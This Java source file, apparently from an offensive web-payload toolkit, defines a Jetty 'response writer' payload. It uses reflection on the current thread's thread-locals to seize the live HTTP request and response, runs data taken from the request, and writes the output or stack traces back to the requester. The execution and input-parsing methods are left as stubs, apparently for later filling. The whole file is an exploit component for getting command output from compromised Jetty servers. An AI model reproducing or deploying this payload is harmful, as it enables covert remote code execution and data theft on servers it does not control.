package com.reajason.javaweb.probe.payload.response;

import org.eclipse.jetty.util.Callback;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;

import static java.nio.charset.StandardCharsets.UTF_8;

/**
 * @author ReaJason
 * @since 2025/8/5
 */
public class JettyWriter {

    private static boolean ok = false;

    public JettyWriter() {
        if (ok) {
            return;
        }
        try {
            Thread thread = Thread.currentThread();
            Object threadLocals = getFieldValue(thread, "threadLocals");
            Object table = getFieldValue(threadLocals, "table");
            for (int i = 0; i < Array.getLength(table); i++) {
                Object entry = Array.get(table, i);
                if (entry == null) {
                    continue;
                }
                Object value = getFieldValue(entry, "value");
                if (value != null && value.getClass().getName().endsWith("HttpConnection")) {
                    Object response;
                    Object request;
                    try {
                        Object httpChannel = invokeMethod(value, "getHttpChannel", null, null);
                        response = invokeMethod(httpChannel, "getResponse", null, null);
                        request = invokeMethod(httpChannel, "getRequest", null, null);
                    } catch (Exception e) {
                        response = invokeMethod(value, "getResponse", null, null);
                        request = invokeMethod(value, "getRequest", null, null);
                    }
                    if (request == null) {
                        continue;
                    }
                    String data = getDataFromReq(request);
                    if (data != null && !data.isEmpty()) {
                        String result = "";
                        try {
                            result = run(data);
                        } catch (Throwable e) {
                            result = getErrorMessage(e);
                        }
                        if (result != null) {
                            try {
                                OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", null, null);
                                outputStream.write(result.getBytes());
                                outputStream.flush();
                                outputStream.close();
                            } catch (Throwable e) {
                                try {
                                    PrintWriter resWriter = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                                    resWriter.write(result);
                                    resWriter.flush();
                                    resWriter.close();
                                } catch (Exception x) {
                                    invokeMethod(response, "setStatus", new Class[]{int.class}, new Object[]{200});
                                    ByteBuffer content = UTF_8.encode(result);
                                    invokeMethod(response, "write", new Class[]{boolean.class, ByteBuffer.class, Callback.class}, new Object[]{true, content, null});
                                }
                            }
                        }
                        return;
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        } finally {
            ok = true;
        }
    }

    private String getDataFromReq(Object request) throws Throwable {
        return null;
    }

    private String run(String data) throws Throwable {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
